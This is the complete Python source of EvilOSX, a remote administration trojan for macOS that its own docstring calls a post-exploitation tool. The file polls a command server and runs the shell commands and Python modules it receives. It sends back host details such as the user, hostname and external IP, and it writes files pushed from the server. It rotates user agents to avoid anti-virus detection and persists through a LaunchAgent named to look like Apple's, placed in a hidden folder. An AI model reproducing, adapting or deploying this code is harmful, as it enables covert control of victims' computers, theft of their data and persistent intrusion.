#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""EvilOSX is a pure python, post-exploitation, RAT (Remote Administration Tool) for macOS / OSX."""
# Random Hash: This text will be replaced when building EvilOSX.
__author__ = "Marten4n6"
__license__ = "GPLv3"
__version__ = "1.1.1"

import time
import urllib2
import urllib
import random
import getpass
import uuid
import subprocess
import threading
import traceback
import os
import json
import base64
from StringIO import StringIO
import sys
import ssl
import logging

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 1337
DEVELOPMENT = True
LAUNCH_AGENT_NAME = "com.apple.EvilOSX"
DISABLE_PERSISTENCE = False

COMMAND_INTERVAL = 0.5  # Interval in seconds to check for commands.
IDLE_TIME = 60  # Time in seconds after which the client will become idle.

MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"

# Logging
logging.basicConfig(format="[%(levelname)s] %(funcName)s:%(lineno)s - %(message)s", level=logging.DEBUG)
log = logging.getLogger(__name__)


def receive_command():
    """Receives a command to execute from the server.

    :return A command object.
    """
    request_path = "https://%s:%s/api/get_command" % (SERVER_HOST, SERVER_PORT)
    headers = {"User-Agent": _get_random_user_agent()}

    username = run_command("whoami")
    hostname = run_command("hostname")
    remote_ip = run_command("curl -s https://icanhazip.com/ --connect-timeout 3")
    current_path = run_command("pwd")

    if remote_ip == "":
        remote_ip = "Unknown"

    # Send the server some basic information about this client.
    data = urllib.urlencode(
        {"client_id": get_uid(), "username": username, "hostname": hostname,
         "remote_ip": remote_ip, "path": current_path}
    )

    # Don't check the hostname when validating the CA.
    ssl.match_hostname = lambda cert, hostname: True

    request = urllib2.Request(url=request_path, headers=headers, data=data)
    response = urllib2.urlopen(request, cafile=get_ca_file())

    response_line = response.readline().replace("\n", "")  # Can't be read twice.
    response_headers = response.info().dict

    if "content-disposition" in response_headers and "attachment" in response_headers["content-disposition"]:
        # The server sent us a file to download (upload module).
        decoded_header = base64.b64decode(response_headers["x-upload-module"]).replace("\n", "")

        output_folder = os.path.expanduser(decoded_header.split(":")[1])
        output_name = os.path.basename(decoded_header.split(":")[2])
        output_file = output_folder + "/" + output_name

        if not os.path.exists(output_folder):
            send_response(MESSAGE_ATTENTION + "Failed to upload file: invalid output folder.", "upload")
        elif os.path.exists(output_file):
            send_response(MESSAGE_ATTENTION + "Failed to upload file: a file with that name already exists.", "upload")
        else:
            with open(output_file, "wb") as output:
                while True:
                    data = response.read(4096)

                    if not data:
                        break
                    output.write(data)

            send_response(MESSAGE_INFO + "File written to: " + output_file, "upload")
        return None
    else:
        if not response_line or response_line == "You dun goofed.":
            return None
        else:
            json_response = json.loads(response_line)

            log.debug("Raw command JSON: %s", str(json_response))

            # Parse the JSON response into a command object.
            return Command(json_response["id"], base64.b64decode(json_response["command"]),
                           json_response["module_name"], True if json_response["is_task"] == 1 else False)


class Command:
    """This class represents a command sent by the server."""

    def __init__(self, client_id, command, module_name="", is_task=False):
        """
        :param client_id The ID of the client which should execute this command.
        :param command The command (or module code) to execute on the client.
        :param module_name The name of the module being executed.
        :param is_task True if this module is a task.
        """
        self.id = client_id
        self.command = command
        self.module_name = module_name
        self.is_task = is_task


def get_uid():
    """:return The unique ID of this client."""
    # The client must be connected to WiFi anyway, so getnode is fine.
    # See https://docs.python.org/2/library/uuid.html#uuid.getnode
    return getpass.getuser() + "-" + str(uuid.getnode())


def _get_random_user_agent():
    """:return A random user-agent string."""
    # Used to hopefully make anti-virus less suspicious of HTTPS requests.
    # Taken from https://techblog.willshouse.com/2012/01/03/most-common-user-agents/
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
    ]
    return random.choice(user_agents)


def run_command(command, cleanup=True, kill_on_timeout=True):
    """Runs a system command and returns its response."""
    if len(command) > 3 and command[0:3] == "cd ":
        try:
            os.chdir(os.path.expanduser(command[3:]))
            return "Directory changed."
        except Exception as ex:
            log.error(str(ex))
            return str(ex)
    else:
        try:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            timer = None

            try:
                if kill_on_timeout:
                    # Kill process after 5 seconds (in case it hangs).
                    timer = threading.Timer(5, lambda process: process.kill(), [process])
                    timer.start()
                stdout, stderr = process.communicate()
                response = stdout + stderr

                if cleanup:
                    return response.replace("\n", "")
                else:
                    if len(response.split("\n")) == 2:  # Response is one line.
                        return response.replace("\n", "")
                    else:
                        return response
            finally:
                if timer:
                    timer.cancel()
        except Exception as ex:
            log.error(str(ex))
            return str(ex)


def run_module(module_code):
    """Executes a module sent by the server.

    :return The module's output.
    :type module_code str
    """
    try:
        new_stdout = StringIO()
        new_stderr = StringIO()

        old_stdout = sys.stdout
        old_stderr = sys.stderr

        # Redirect output.
        sys.stdout = new_stdout
        sys.stderr = new_stderr

        exec module_code in globals()
        # TODO - Find a way to remove the executed code from globals, probably won't happen though.

        # Restore output.
        sys.stdout = old_stdout
        sys.stderr = old_stderr

        response = new_stdout.getvalue() + new_stderr.getvalue()
    except Exception:
        response = MESSAGE_ATTENTION + "Error executing module: " + traceback.format_exc()
    return response


class KillableThread(threading.Thread):
    """Subclass of threading.Thread with a kill() method.

    See https://mail.python.org/pipermail/python-list/2004-May/281944.html
    """

    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        """Start the thread."""
        self.__run_backup = self.run
        self.run = self.__run  # Force the thread to install our trace.
        threading.Thread.start(self)

    def __run(self):
        """Hacked run function which installs the trace."""
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == "call":
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == "line":
                raise SystemExit()
        return self.localtrace

    def kill(self):
        self.killed = True


def send_response(response, module_name=""):
    """Sends a response in JSON to the server, base64 encodes the response.

    :type response str
    :type module_name str
    """
    request_path = "https://%s:%s/api/response" % (SERVER_HOST, SERVER_PORT)
    headers = {"User-Agent": _get_random_user_agent()}

    json_data = json.dumps({"response": base64.b64encode(response), "module_name": module_name})
    data = urllib.urlencode({"output": base64.b64encode(json_data)})

    request = urllib2.Request(url=request_path, headers=headers, data=data)
    urllib2.urlopen(request, cafile=get_ca_file())


def setup_persistence():
    """Makes EvilOSX persist system reboots."""
    run_command("mkdir -p %s" % get_program_directory())
    run_command("mkdir -p %s" % get_launch_agent_directory())

    # Create launch agent
    log.debug("Creating launch agent...")

    launch_agent_create = """\
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>KeepAlive</key>
            <true/>
            <key>Label</key>
            <string>%s</string>
            <key>ProgramArguments</key>
            <array>
                <string>%s</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
        </dict>
        </plist>
        """ % (LAUNCH_AGENT_NAME, get_program_file())

    with open(get_launch_agent_file(), "w") as open_file:
        open_file.write(launch_agent_create)

    # Move EvilOSX
    log.debug("Moving EvilOSX...")

    if DEVELOPMENT:
        with open(__file__, "rb") as input_file, open(get_program_file(), "wb") as output_file:
            output_file.write(input_file.read())
    else:
        os.rename(__file__, get_program_file())
    os.chmod(get_program_file(), 0777)

    # Load launch agent
    log.debug("Loading launch agent...")

    output = run_command("launchctl load -w %s" % get_launch_agent_file())

    if output == "":
        if run_command("launchctl list | grep -w %s" % LAUNCH_AGENT_NAME):
            log.debug("Done!")
            sys.exit(0)
        else:
            log.error("Failed to load launch agent.")
    elif "already loaded" in output.lower():
        log.error("EvilOSX is already loaded.")
        sys.exit(0)
    else:
        log.error("Unexpected output: %s", output)
        pass


def get_program_directory():
    """:return The program directory where EvilOSX lives."""
    return os.path.expanduser("~/Library/Containers/.EvilOSX")


def get_program_file():
    """:return The path to the EvilOSX file."""
    return get_program_directory() + "/EvilOSX"


def get_launch_agent_directory():
    """:return The directory where the launch agent lives."""
    return os.path.expanduser("~/Library/LaunchAgents")


def get_launch_agent_file():
    """:return The path to the launch agent."""
    return get_launch_agent_directory() + "/%s.plist" % LAUNCH_AGENT_NAME


def get_ca_file():
    """:return The path to the server certificate authority file."""
    ca_file = get_program_directory() + "/server.cert"

    if not os.path.exists(ca_file):
        # Ignore the CA only for this request!
        request_context = ssl.create_default_context()
        request_context.check_hostname = False
        request_context.verify_mode = ssl.CERT_NONE

        request = urllib2.Request(url="https://%s:%s/api/get_ca" % (SERVER_HOST, SERVER_PORT))
        response = urllib2.urlopen(request, context=request_context)
        
        run_command("mkdir -p %s" % get_program_directory())
        with open(ca_file, "w") as input_file:
            input_file.write(base64.b64decode(str(response.readline())))
        return ca_file
    else:
        return ca_file


def main():
    """Main program loop."""
    last_active = time.time()  # The last time a command was requested from the server.
    idle = False
    tasks = []  # List of tuples containing the task name and thread.

    if os.path.dirname(os.path.realpath(__file__)).lower() != get_program_directory().lower():
        if not DEVELOPMENT and not DISABLE_PERSISTENCE:
            # Setup persistence.
            setup_persistence()

    while True:
        try:
            log.info("Receiving command...")
            command = receive_command()

            if command:
                if idle:
                    log.info("Switching from idle back to normal mode...")

                last_active = time.time()
                idle = False

                if command.module_name:
                    # Run a module.
                    log.info("Running module: %s", command.module_name)

                    if command.command.startswith("kill_task"):
                        log.info("Attempting to kill task \"%s\"..." % command.module_name)
                        found_task = False

                        for task in tasks:
                            task_name, task_thread = task

                            if task_name != command.module_name:
                                continue
                            else:
                                found_task = True
                                task_thread.kill()
                                tasks.remove(task)

                                log.info("Task stopped.")
                                send_response("Task stopped.")
                                break

                        if not found_task:
                            log.info("Failed to find running task.")
                            send_response("Failed to find running task.")
                    elif command.is_task:
                        log.info("This module is a task, running in separate thread...")

                        task_thread = KillableThread(target=run_module, args=(command.command,))
                        task_thread.daemon = True
                        task_thread.start()

                        tasks.append((command.module_name, task_thread))
                    else:
                        send_response(run_module(command.command), command.module_name)
                else:
                    # Run a system command.
                    log.info("Running command: %s", command.command)

                    send_response(run_command(command.command, cleanup=False))
            else:
                log.info("No command received.")

                if idle:
                    time.sleep(30)
                elif (time.time() - last_active) > IDLE_TIME:
                    log.info("The last command was a while ago, switching to idle...")
                    idle = True
                else:
                    time.sleep(COMMAND_INTERVAL)
        except Exception as ex:
            if "Connection refused" in str(ex):
                # The server is offline.
                log.warn("Failed to connect to the server.")
                time.sleep(5)
            elif "certificate" in str(ex):
                # Invalid certificate authority.
                log.error("Error: %s", str(ex))
                log.error("Invalid certificate authority, removing...")
                os.remove(get_program_directory() + "/server.cert")
            else:
                log.error(traceback.format_exc())
                time.sleep(5)


if __name__ == '__main__':
    main()
